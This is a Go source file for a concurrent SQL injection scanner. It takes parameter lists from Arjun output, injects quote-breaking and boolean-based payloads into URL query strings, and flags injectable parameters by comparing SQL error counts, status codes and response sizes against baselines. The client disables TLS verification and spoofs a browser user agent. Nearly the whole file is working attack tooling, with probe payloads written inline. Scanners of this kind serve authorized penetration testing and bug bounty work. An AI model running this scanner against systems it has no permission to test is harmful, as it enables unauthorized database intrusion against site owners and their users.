package main

import (
	"crypto/tls"
	"encoding/json"
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"github.com/PuerkitoBio/goquery"
	"github.com/google/go-cmp/cmp"
	"github.com/michael1026/param-sqli/payloads"
	"github.com/michael1026/param-sqli/util"
	"github.com/projectdiscovery/fastdialer/fastdialer"
)

type CookieInfo map[string]string
type ArjunResult struct {
	Params []string `json:"params"`
}

type ArjunResults map[string]ArjunResult

type UrlParam struct {
	url    string
	params []string
}

type Baseline struct {
	Url               string
	SQLErrorCount     int
	ContentLength     int
	Reflections       int
	StatusCode        int
	GenericErrorCount int
}

func main() {
	filePath := flag.String("i", "", "file path for input file")
	threads := flag.Int("t", 20, "Number of concurrent threads to use")
	flag.Parse()
	client := buildHttpClient()
	ar := readParameterJson(filePath)
	wg := &sync.WaitGroup{}

	if ar == nil {
		fmt.Println("Error: Must provide a file")
		return
	}

	for i := 0; i < *threads; i++ {
		wg.Add(1)

		go worker(ar, client, wg)
	}

	close(*ar)

	wg.Wait()
}

func addQueryToURL(parsedUrl url.URL, parameter string, payload string) url.URL {
	q := parsedUrl.Query()
	q.Add(parameter, payload)
	parsedUrl.RawQuery = q.Encode()
	return parsedUrl
}

func readParameterJson(filepath *string) *chan UrlParam {
	jsonFile, err := os.Open(*filepath)
	var arjunResults ArjunResults

	if err != nil {
		fmt.Printf("Error reading JSON: %s\n", err)
		return nil
	}

	defer jsonFile.Close()

	bytes, _ := ioutil.ReadAll(jsonFile)

	err = json.Unmarshal(bytes, &arjunResults)

	if err != nil {
		fmt.Printf("Unmarshal error: %s\n", err)
		return nil
	}

	urlParams := make(chan UrlParam, len(arjunResults))

	for rawUrl, params := range arjunResults {
		urlParams <- UrlParam{rawUrl, params.Params}
	}

	return &urlParams
}

func worker(ar *chan UrlParam, client *http.Client, wg *sync.WaitGroup) {
	defer wg.Done()
	for urlParam := range *ar {
		// There shouldn't be over 100 parameters found for a single endpoint
		// so let's just consider this invalid and skip the results

		if len(urlParam.params) > 100 {
			continue
		}
		for _, param := range urlParam.params {
			parsedUrl, parseErr := url.Parse(urlParam.url)

			if parseErr != nil {
				return
			}

			scanner(parsedUrl, param, client)
		}
	}
}

func errorDetection(parsedUrl *url.URL, param string, client *http.Client) (int, error) {
	payload := "wrtqva'\");--//"

	newUrl := addQueryToURL(*parsedUrl, param, payload)
	doc, status, err := makeRequestGetDocument(newUrl.String(), client)
	if err != nil || status != http.StatusOK {
		return 0, errors.New("Request unsuccessful")
	}

	return countSQLErrors(doc)
}

func getRequestResponseInfo(parsedUrl *url.URL, param string, payload string, client *http.Client) (Baseline, error) {
	baseline := Baseline{}

	newUrl := addQueryToURL(*parsedUrl, param, payload)
	doc, status, err := makeRequestGetDocument(newUrl.String(), client)

	if err != nil || doc == nil {
		return baseline, errors.New("Error making baseline request")
	}

	sqlErrorCount, err := countSQLErrors(doc)
	genericErrorCount, err := countGenericErrors(doc)

	if err != nil {
		return baseline, errors.New("Error counting errors")
	}

	html, err := doc.Html()

	if err != nil {
		return baseline, errors.New("Error reading HTML")
	}

	baseline.ContentLength = len(html)
	baseline.Url = parsedUrl.String()
	baseline.SQLErrorCount = sqlErrorCount
	baseline.GenericErrorCount = genericErrorCount
	baseline.Reflections = countReflections(doc, payload)
	baseline.StatusCode = status

	return baseline, nil
}

func countSQLErrors(doc *goquery.Document) (int, error) {
	html, err := doc.Html()

	if err != nil {
		return 0, err
	}

	count := 0

	sqlErrors := []string{
		"error in your SQL syntax",
		"mysql_numrows()",
		"Input String was not in a correct format",
		"mysql_fetch",
		"Error Executing Database Query",
		"Unclosed quotation mark",
	}

	for _, error := range sqlErrors {
		count += strings.Count(html, error)
	}

	return count, nil
}

func countGenericErrors(doc *goquery.Document) (int, error) {
	html, err := doc.Html()

	if err != nil {
		return 0, err
	}

	count := strings.Count(html, "error")
	count += strings.Count(html, "Error")

	return count, nil
}

func scanner(parsedUrl *url.URL, param string, client *http.Client) {
	// formattedPayloads := []string{
	// 	"\" %s \"%d\"=\"%d",
	// 	"' %s '%d'='%d",
	// 	" %s %d=%d",
	// 	"' %s '%d'='%d'--",
	// 	"\" %s \"%d\"=\"%d\"--",
	// }

	baseline1, err := getRequestResponseInfo(parsedUrl, param, util.RandString(5), client)
	if err != nil || baseline1.StatusCode != http.StatusOK {
		return
	}

	errorBaseline, err := getRequestResponseInfo(parsedUrl, param, "0`z'z\"${{%25{{\\", client)
	if err != nil {
		return
	}

	if errorBaseline.StatusCode == http.StatusInternalServerError || errorBaseline.SQLErrorCount > baseline1.SQLErrorCount || errorBaseline.GenericErrorCount > baseline1.GenericErrorCount {
		if testWithErrorPayloads(payloads.SingleQuoteSuccessPayloads(), payloads.SingleQuoteErrorPayloads(), parsedUrl, param, baseline1, client) {
			fmt.Printf("SQLi in %s on %s. Payload: %s\n", param, parsedUrl.String(), "0'")
		}

		if testWithErrorPayloads(payloads.DoubleQuoteSuccessPayloads(), payloads.DoubleQuoteErrorPayloads(), parsedUrl, param, baseline1, client) {
			fmt.Printf("SQLi in %s on %s. Payload: %s\n", param, parsedUrl.String(), "0\"")
		}

		if testWithErrorPayloads(payloads.NoQuoteSuccessPayloads(), payloads.NoQuoteErrorPayloads(), parsedUrl, param, baseline1, client) {
			fmt.Printf("SQLi in %s on %s. Payload: %s\n", param, parsedUrl.String(), "0'\"")
		}
	}

	// baseline2, err := getRequestResponseInfo(parsedUrl, param, util.RandString(5), client)

	// if err != nil {
	// 	// fmt.Printf("URL is unstable\n")
	// 	return
	// }

	// if !cmp.Equal(baseline1, baseline2) {
	// 	return
	// }

	// baseline3, err := getRequestResponseInfo(parsedUrl, param, util.RandString(5), client)

	// if !cmp.Equal(baseline2, baseline3) {
	// 	return
	// }

	// errorCount, _ := errorDetection(parsedUrl, param, client)

	// if errorCount > baseline1.SQLErrorCount {
	// 	fmt.Printf("SQLi in %s on %s. Payload: %s\n", param, parsedUrl.String(), "wrtqva'\");--//")
	// 	return
	// }

	// for _, payload := range formattedPayloads {
	// 	if testWithFormattedString(payload, parsedUrl, param, client) {
	// 		return
	// 	}
	// }
}

func testWithErrorPayloads(successPayloads []string, errorPayloads []string, parsedUrl *url.URL, param string, baseline Baseline, client *http.Client) (sqliFound bool) {
	for _, payload := range errorPayloads {
		result, err := getRequestResponseInfo(parsedUrl, param, payload, client)

		// something wrong with the request.
		if err != nil {
			return false
		}

		// if everything seems normal, return false
		if result.StatusCode != http.StatusInternalServerError && result.SQLErrorCount == baseline.SQLErrorCount && result.GenericErrorCount == baseline.GenericErrorCount && !sizesSignificantlyDifferent(result.ContentLength, baseline.ContentLength) {
			return false
		}
	}

	for _, payload := range successPayloads {
		result, err := getRequestResponseInfo(parsedUrl, param, payload, client)

		// something wrong with the request.
		if err != nil {
			return false
		}

		if err != nil || result.StatusCode != http.StatusOK || result.SQLErrorCount > baseline.SQLErrorCount || result.GenericErrorCount > baseline.GenericErrorCount || sizesSignificantlyDifferent(result.ContentLength, baseline.ContentLength) {
			return false
		}
	}

	return true
}

func testWithFormattedString(formattedPayload string, parsedUrl *url.URL, param string, client *http.Client) bool {
	trueStatement, err := getRequestResponseInfo(parsedUrl, param, fmt.Sprintf(formattedPayload, "or", 1000, 1000), client)

	if err != nil || trueStatement.StatusCode != http.StatusOK {
		return false
	}

	for i := 0; i < 2; i++ {
		randInt := rand.Intn(9999)

		trueStatement2, err := getRequestResponseInfo(parsedUrl, param, fmt.Sprintf(formattedPayload, "or", randInt, randInt), client)

		if err != nil || trueStatement2.StatusCode != http.StatusOK {
			return false
		}

		if !cmp.Equal(trueStatement, trueStatement2) {
			return false
		}
	}

	for i := 0; i < 2; i++ {
		randInt1 := rand.Intn(9999)
		randInt2 := rand.Intn(9999)

		falseStatement, err := getRequestResponseInfo(parsedUrl, param, fmt.Sprintf(formattedPayload, "and", randInt1, randInt2), client)

		if err != nil || falseStatement.StatusCode != http.StatusOK {
			return false
		}

		if !sizesSignificantlyDifferent(trueStatement.ContentLength, falseStatement.ContentLength) || falseStatement.Reflections != trueStatement.Reflections {
			return false
		}
	}

	fmt.Printf(fmt.Sprintf("SQLi in %s on %s. Payload: %s\n", param, parsedUrl.String(), fmt.Sprintf(formattedPayload, "or", 1, 1)))
	return true
}

func sizesSignificantlyDifferent(one int, two int) bool {
	if ((float64(two) / float64(one)) * 100) > 105 {
		return true
	} else if ((float64(one) / float64(two)) * 100) > 105 {
		return true
	}
	return false
}

func buildHttpClient() (c *http.Client) {
	fastdialerOpts := fastdialer.DefaultOptions
	fastdialerOpts.EnableFallback = true
	dialer, err := fastdialer.NewDialer(fastdialerOpts)
	if err != nil {
		fmt.Printf("Error building HTTP client: %s\n", err)
		return
	}

	transport := &http.Transport{
		MaxIdleConns:      -1,
		IdleConnTimeout:   time.Second,
		TLSClientConfig:   &tls.Config{InsecureSkipVerify: true},
		DisableKeepAlives: true,
		DialContext:       dialer.Dial,
	}

	re := func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse
	}

	client := &http.Client{
		Transport:     transport,
		CheckRedirect: re,
		Timeout:       time.Second * 5,
	}

	return client
}

func makeRequestGetDocument(rawUrl string, client *http.Client) (doc *goquery.Document, status int, err error) {
	req, err := http.NewRequest("GET", rawUrl, nil)
	if err != nil {
		return nil, -1, err
	}
	req.Close = true
	req.Header.Set("Connection", "close")
	req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/81.0")
	req.Header.Add("Accept-Language", "en-US,en;q=0.9")
	req.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")

	resp, err := client.Do(req)
	if err != nil {
		return nil, -1, err
	}

	defer resp.Body.Close()

	doc, err = goquery.NewDocumentFromReader(resp.Body)

	if err != nil {
		return nil, -1, err
	}

	return doc, resp.StatusCode, nil
}

func countReflections(doc *goquery.Document, canary string) int {
	html, err := doc.Html()

	if err != nil {
		fmt.Printf("Error converting to HTML: %s\n", err)
	}

	return strings.Count(html, canary)
}
